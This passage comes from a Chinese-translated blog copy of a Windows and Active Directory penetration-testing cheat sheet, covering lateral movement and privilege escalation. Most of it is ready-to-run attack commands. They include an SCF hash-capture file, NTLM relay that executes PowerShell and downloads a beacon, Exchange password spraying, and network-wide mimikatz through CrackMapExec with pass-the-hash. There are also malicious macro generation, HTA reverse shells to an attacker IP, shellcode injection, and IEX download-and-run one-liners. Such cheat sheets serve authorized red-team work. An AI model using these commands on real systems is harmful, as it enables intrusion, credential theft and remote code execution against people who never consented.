tip.</span><br></pre></td></tr></table></figure><h2 id="3-4-SCF文件攻击"><a href="#3-4-SCF文件攻击" class="headerlink" title="3.4 SCF文件攻击"></a>3.4 SCF文件攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Create .scf file and drop inside SMB Share and fire up Responder ;) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Filename = @m0chan.scf</span><br><span class="line"></span><br><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.14.2\Share\test.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure><h2 id="3-5-NTLM-Relay"><a href="#3-5-NTLM-Relay" class="headerlink" title="3.5 NTLM-Relay"></a>3.5 NTLM-Relay</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Good article explaining differences between NTLM/Net-NTLMV1&amp;V2</span><br><span class="line"></span><br><span class="line">https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</span><br><span class="line"></span><br><span class="line">TL;DR NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing.</span><br><span class="line"></span><br><span class="line">You CAN perform Pass-The-Hash attacks with NTLM hashes.</span><br><span class="line">You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes.</span><br><span class="line"></span><br><span class="line">PS: You CANNOT relay a hash back to itself.</span><br><span class="line">PS: SMB Signing must be disabled to mitigate this, you can check with nmap scan or crackmapexec</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 --gene-relay-list targets.txt</span><br><span class="line"></span><br><span class="line">This will tell you a list of hosts within a subnet which do not have SMB Signing enabled.</span><br><span class="line"></span><br><span class="line">python Responder.py -I &lt;interface&gt; -r -d -w</span><br><span class="line">ntlmrelayx.py -tf targets.txt (By default this will dump the local SAM of the targets, not very useful?)</span><br><span class="line"></span><br><span class="line">How about we execute a command instead.</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasd</span><br><span class="line">ntlmrelayx.py -tf targets.txt -c powershell.exe /c download and execute beacon... = RIP</span><br></pre></td></tr></table></figure><h2 id="3-6-私下交易"><a href="#3-6-私下交易" class="headerlink" title="3.6 私下交易"></a>3.6 私下交易</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</span><br><span class="line"></span><br><span class="line">Combine privxchange.py and ntlmrelayx</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldap://DOMAINCONTROLLER.m0chanAD.local --escalate-user TARGETUSERTOESCALATE</span><br><span class="line"></span><br><span class="line">python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -u TARGETUSERTOESCALATE -d m0chanAD.local</span><br></pre></td></tr></table></figure><h2 id="3-7-Exchange-Password-Spray"><a href="#3-7-Exchange-Password-Spray" class="headerlink" title="3.7 Exchange Password Spray"></a>3.7 Exchange Password Spray</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/dafthack/MailSniper.git</span><br><span class="line"></span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname EXCH2012.m0chanAD.local -UserList .\users.txt -Password Winter2019</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#https://github.com/sensepost/ruler</span><br><span class="line"></span><br><span class="line">./ruler-linux64 -domain mc0hanAD.local --insecure brute --userpass userpass.txt -v</span><br></pre></td></tr></table></figure><h2 id="3-8-ExchangeRelayX"><a href="#3-8-ExchangeRelayX" class="headerlink" title="3.8 ExchangeRelayX"></a>3.8 ExchangeRelayX</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/quickbreach/ExchangeRelayX</span><br><span class="line"></span><br><span class="line">An NTLM relay tool to the EWS endpoint for on-premise exchange servers. Provides an OWA for hackers.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./exchangeRelayx.py -t https://mail.quickbreach.com</span><br></pre></td></tr></table></figure><h2 id="3-9-Exchange-Mailbox-Post-Compromise"><a href="#3-9-Exchange-Mailbox-Post-Compromise" class="headerlink" title="3.9 Exchange Mailbox Post-Compromise"></a>3.9 Exchange Mailbox Post-Compromise</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/dafthack/MailSniper.git</span><br><span class="line"></span><br><span class="line">Enumerate GlobalAddressList</span><br><span class="line"></span><br><span class="line">Get-GlobalAddressList -ExchHostname EXCH2012.m0chanAD.local -Username jamie@m0chanAD.local -Password Winter2019</span><br><span class="line"></span><br><span class="line">Enumerate AD Usernames</span><br><span class="line"></span><br><span class="line">Get-ADUsernameFromEWS -Emaillist .\users.txt</span><br><span class="line"></span><br><span class="line">Enumerate Mailbox Folders</span><br><span class="line"></span><br><span class="line">Get-MailboxFolders -Mailbox jamie@m0chanAD.local</span><br><span class="line"></span><br><span class="line">Enumerate Passwords &amp; Credentials Stored in Emails</span><br><span class="line"></span><br><span class="line">Invoke-SelfSearch -Mailbox jamie@m0chanAD.local</span><br><span class="line"></span><br><span class="line">Enumerate Passwords &amp; Credentials (Any Users) Requires DA or Exchange Admin</span><br><span class="line"></span><br><span class="line">Invoke-GlobalMailSearch -ImpersonationAccount helenHR -ExchHostname Exch2012</span><br></pre></td></tr></table></figure><h2 id="3-10-CrackMapExec"><a href="#3-10-CrackMapExec" class="headerlink" title="3.10 CrackMapExec"></a>3.10 CrackMapExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">CrackMapExec is installed on Kali or get Windows Binary from Github.</span><br><span class="line"></span><br><span class="line">Has 3 Execution Methods</span><br><span class="line">crackmapexec smb &lt;- Creating and Running a Service over SMB</span><br><span class="line">crackmapexec wmi &lt;- Executes command over WMI</span><br><span class="line">crackmapexec at &lt;- Schedules Task with Task Scheduler</span><br><span class="line"></span><br><span class="line">Can execute plain commands with -X flag i/e </span><br><span class="line"></span><br><span class="line">crcakmapexec smb 10.10.14.0/24 -x whoami</span><br><span class="line"></span><br><span class="line">crcakmapexec smb 10.10.14.0/24 &lt;- Host Discovery</span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; </span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --pass-pol</span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --shares</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Can also PTH with CME</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -H e8bcd502fbbdcd9379305dca15f4854e</span><br><span class="line"></span><br><span class="line">cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth --shares </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--local-auth is for Authenticating with Local Admin, good if Organisaton uses same local admin hash through network and not using LAPS</span><br><span class="line"></span><br><span class="line">Dump Local SAM hashes</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth --sam</span><br><span class="line"></span><br><span class="line">Running Mimikatz </span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth -M mimikatz</span><br><span class="line"></span><br><span class="line">^ Very noisy but yes you can run mimikatz across a WHOLE network range. RIP Domain Admin</span><br><span class="line"></span><br><span class="line">Enum AV Products</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth -M enum_avproducts</span><br></pre></td></tr></table></figure><h2 id="3-11-邮件狙击手"><a href="#3-11-邮件狙击手" class="headerlink" title="3.11 邮件狙击手"></a>3.11 邮件狙击手</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019</span><br><span class="line"></span><br><span class="line">[*] Now spraying the OWA portal at https://m0chanAD.local/owa/</span><br><span class="line"></span><br><span class="line">[*] SUCCESS! User:m0chan:Summer2019</span><br><span class="line"></span><br><span class="line">Lmao, you really think Id use the pass Summer2019?</span><br></pre></td></tr></table></figure><h2 id="3-12-Kerberos-Stuff"><a href="#3-12-Kerberos-Stuff" class="headerlink" title="3.12 Kerberos Stuff"></a>3.12 Kerberos Stuff</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br></pre></td></tr></table></figure><h2 id="3-13-MSSQL利用（PowerUpSQL）"><a href="#3-13-MSSQL利用（PowerUpSQL）" class="headerlink" title="3.13 MSSQL利用（PowerUpSQL）"></a>3.13 MSSQL利用（PowerUpSQL）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/NetSPI/PowerUpSQL</span><br><span class="line"></span><br><span class="line">#View SQL Instances</span><br><span class="line">Get-SQLInstanceDomain [| Get-SQLServerInfo]</span><br><span class="line"></span><br><span class="line">#Login in with Domain Account</span><br><span class="line">Get-SQLConnectionTestThreaded</span><br><span class="line"></span><br><span class="line">#Login in with Default Password</span><br><span class="line">Get-SQLServerDefaultLoginPw</span><br><span class="line"></span><br><span class="line">#List DB, Tables &amp; Columns</span><br><span class="line"></span><br><span class="line">Get-SQLInstanceDomain | Get-SQLDatabase</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DB_name&gt;</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DB_name&gt; -TableName &lt;Table_name&gt;</span><br><span class="line"></span><br><span class="line">#Search Column Names for Word</span><br><span class="line"></span><br><span class="line">Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords &quot;&lt;word1,word2&gt;&quot; -Verbose -SampleSize 10</span><br><span class="line"></span><br><span class="line">#Try to Execute Commands (RCE)</span><br><span class="line"></span><br><span class="line">Invoke-SQLOSCmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Enable XP_CMDShell Process</span><br><span class="line"></span><br><span class="line">EXEC sp_configure &apos;show advanced options&apos;, 1;  </span><br><span class="line">go  </span><br><span class="line">RECONFIGURE;  </span><br><span class="line">go  </span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;, 1;  </span><br><span class="line">go  </span><br><span class="line">RECONFIGURE;  </span><br><span class="line">go  </span><br><span class="line">xp_cmdshell &apos;&lt;cmd&gt;&apos;</span><br><span class="line">go</span><br></pre></td></tr></table></figure><h2 id="3-14-Malicious-Macro-with-MSBuild"><a href="#3-14-Malicious-Macro-with-MSBuild" class="headerlink" title="3.14 Malicious Macro with MSBuild"></a>3.14 Malicious Macro with MSBuild</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/infosecn1nja/MaliciousMacroMSBuild</span><br><span class="line"></span><br><span class="line">#https://lolbas-project.github.io/lolbas/Binaries/Msbuild/ - MSBuild Explained</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a PowerShell MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p powershell -i /path/payload.ps1 -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a Custom MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p custom -i /path/msbuild.xml -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro With Kill Date</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -k 20/03/2018</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro With Environmental Keying</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain, microsoft, github</span><br></pre></td></tr></table></figure><h2 id="3-15-WeirdHTA-Undetectable-HTA"><a href="#3-15-WeirdHTA-Undetectable-HTA" class="headerlink" title="3.15 WeirdHTA - Undetectable HTA"></a>3.15 WeirdHTA - Undetectable HTA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/felamos/weirdhta</span><br><span class="line"></span><br><span class="line">python3 --help</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --normal (for normal powershell reverse_shell)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --smb (without powershell payload, it will use smb)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --powercat (for powercat)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --command &apos;c:\windows\system32\cmd.exe&apos; (custom command)</span><br></pre></td></tr></table></figure><h2 id="3-16-EvilWinRM"><a href="#3-16-EvilWinRM" class="headerlink" title="3.16 EvilWinRM"></a>3.16 EvilWinRM</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Hackplayers/evil-winrm</span><br><span class="line"></span><br><span class="line">Ultimate Shell for WinRM Connections</span><br><span class="line"></span><br><span class="line">Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ]</span><br><span class="line">    -S, --ssl                        Enable SSL</span><br><span class="line">    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate</span><br><span class="line">    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate</span><br><span class="line">    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path</span><br><span class="line">    -e, --executables EXES_PATH      C# executables local path</span><br><span class="line">    -i, --ip IP                      Remote host IP or hostname (required)</span><br><span class="line">    -U, --url URL                    Remote url endpoint (default /wsman)</span><br><span class="line">    -u, --user USER                  Username (required)</span><br><span class="line">    -p, --password PASS              Password</span><br><span class="line">    -P, --port PORT                  Remote host port (default 5985)</span><br><span class="line">    -V, --version                    Show version</span><br><span class="line">    -h, --help                       Display this help message</span><br></pre></td></tr></table></figure><p>3.17 GetVulnerableGPO</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/gpoguy/GetVulnerableGPO</span><br><span class="line"></span><br><span class="line">PowerShell script to find &apos;vulnerable&apos; security-related GPOs that should be hardened (for more background, see the GPO discoverability section of this blog: https://sdmsoftware.com/group-policy-blog/security-related/security-fun-bloodhound-ms16-072-gpo-discoverability/) Requires GPMC &amp; SDM Software GPMC PowerShell Module (used to more easily parse GP settings during the search): https://s3.amazonaws.com/sdmsoftware.com/dl/SDM-GPMC-Module2.0Setup.zip</span><br></pre></td></tr></table></figure><p>3.18 Invoke-PSImage</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/peewpw/Invoke-PSImage</span><br><span class="line"></span><br><span class="line">Encodes a PowerShell script in the pixels of a PNG file and generates a oneliner to execute</span><br><span class="line"></span><br><span class="line">Invoke-PSImage takes a PowerShell script and encodes the bytes of the script into the pixels of a PNG image. It generates a oneliner for executing either from a file of from the web.</span><br><span class="line"></span><br><span class="line">PS&gt;Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg</span><br><span class="line">   [Oneliner to execute from a file]</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">PS&gt;Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest</span><br><span class="line">   [Oneliner to execute from the web]</span><br></pre></td></tr></table></figure><h2 id="3-17-Meterpreter-Donut-Shellcode注入-NET"><a href="#3-17-Meterpreter-Donut-Shellcode注入-NET" class="headerlink" title="3.17 Meterpreter + Donut-Shellcode注入.NET"></a>3.17 Meterpreter + Donut-Shellcode注入.NET</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html</span><br><span class="line"></span><br><span class="line">A module for executing arbitrary shellcode within Meterpreter aka executing Mimikatz in-memory, reflectively and interactively!</span><br><span class="line"></span><br><span class="line">donut -f /tmp/mimikatz.exe -a 2 -o /tmp/payload.bin</span><br><span class="line"></span><br><span class="line">use post/windows/manage/shellcode_inject</span><br><span class="line">set SHELLCODE /tmp/payload.bin</span><br><span class="line">set SESSION 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h1 id="0x04-特权提升"><a href="#0x04-特权提升" class="headerlink" title="0x04 特权提升"></a>0x04 特权提升</h1><blockquote><p>参考：<a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank" rel="noopener">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></p><p>运行此脚本：<a href="https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat" target="_blank" rel="noopener">https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat</a></p></blockquote><h2 id="4-1-基本命令"><a href="#4-1-基本命令" class="headerlink" title="4.1 基本命令"></a>4.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe</span><br><span class="line">net users</span><br><span class="line">hostname</span><br><span class="line">whoami</span><br><span class="line">net localgroups</span><br><span class="line">echo %logonserver%</span><br><span class="line">netsh firewall show state</span><br><span class="line">netsh firewall show config</span><br><span class="line">netstat -an</span><br><span class="line">type C:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><h2 id="4-2-PowerUp-ps1（有时是快速获胜）"><a href="#4-2-PowerUp-ps1（有时是快速获胜）" class="headerlink" title="4.2 PowerUp.ps1（有时是快速获胜）"></a>4.2 PowerUp.ps1（有时是快速获胜）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe /c IEX(New-Object Net.WebClient).downloadString(&apos;webserver/PowerUp.ps1&apos;) ;Invoke-AllChecks</span><br></pre></td></tr></table></figure><h2 id="4-3-锐化"><a href="#4-3-锐化" class="headerlink" title="4.3 锐化"></a>4.3 锐化</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SharpUp</span><br><span class="line"></span><br><span class="line">C Sharp Implementation of PowerUp.ps1 which can be reflectively loaded.</span><br></pre></td></tr></table></figure><h2 id="4-4-如果是公元，引进猎狗犬…"><a href="#4-4-如果是公元，引进猎狗犬…" class="headerlink" title="4.4  如果是公元，引进猎狗犬…"></a>4.4  如果是公元，引进猎狗犬…</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.ps1</span><br><span class="line">SharpHound.exe -&gt; https://github.com/BloodHoundAD/SharpHound</span><br><span class="line"></span><br><span class="line">IEX(System.Net.WebClient.DownloadString(&apos;http://webserver:4444/SharpHound.ps1&apos;))</span><br><span class="line"></span><br><span class="line">Invoke-CollectionMethod All</span><br><span class="line"></span><br><span class="line">Import .zip to Bloodhound</span><br><span class="line"></span><br><span class="line">If you can&apos;t exfil the .zip... Find a way ;) I joke, I joke. Output as plain json and copy over manually. It&apos;s a big big pain but it works.</span><br></pre></td></tr></table></figure><h2 id="4-5-Bloodhound-Python"><a href="#4-5-Bloodhound-Python" class="headerlink" title="4.5 Bloodhound-Python"></a>4.5 Bloodhound-Python</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/fox-it/BloodHound.py.git</span><br><span class="line">cd BloodHound.py/ &amp;&amp; pip install .</span><br><span class="line"></span><br><span class="line">bloodhound-python -d m0chanAD.local -u m0chan -p Summer2019 -gc DOMAINCONTROLLER.m0chanAD.local -c all</span><br></pre></td></tr></table></figure><h2 id="4-6-明文密码"><a href="#4-6-明文密码" class="headerlink" title="4.6 明文密码"></a>4.6 明文密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Windows autologin</span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span><br><span class="line"></span><br><span class="line"># VNC</span><br><span class="line">reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span><br><span class="line"></span><br><span class="line"># SNMP Parameters</span><br><span class="line">reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span><br><span class="line"></span><br><span class="line"># Putty</span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br><span class="line"></span><br><span class="line"># Search for password in registry</span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure><h2 id="4-7-查看已安装的软件"><a href="#4-7-查看已安装的软件" class="headerlink" title="4.7 查看已安装的软件"></a>4.7 查看已安装的软件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tasklist /SVC</span><br><span class="line">net start</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE</span><br><span class="line">DRIVERQUERY</span><br><span class="line"></span><br><span class="line">dir /a &quot;C:\Program Files&quot;</span><br><span class="line">dir /a &quot;C:\Program Files (x86)&quot;</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE</span><br><span class="line"></span><br><span class="line">Get-ChildItem &apos;C:\Program Files&apos;, &apos;C:\Program Files (x86)&apos; | ft Parent,Name,LastWriteTime</span><br><span class="line"></span><br><span class="line">Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name</span><br></pre></td></tr></table></figure><h2 id="4-8-弱文件夹权限"><a href="#4-8-弱文件夹权限" class="headerlink" title="4.8 弱文件夹权限"></a>4.8 弱文件夹权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Full Permissions for &apos;Everyone&apos; on Program Folders</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 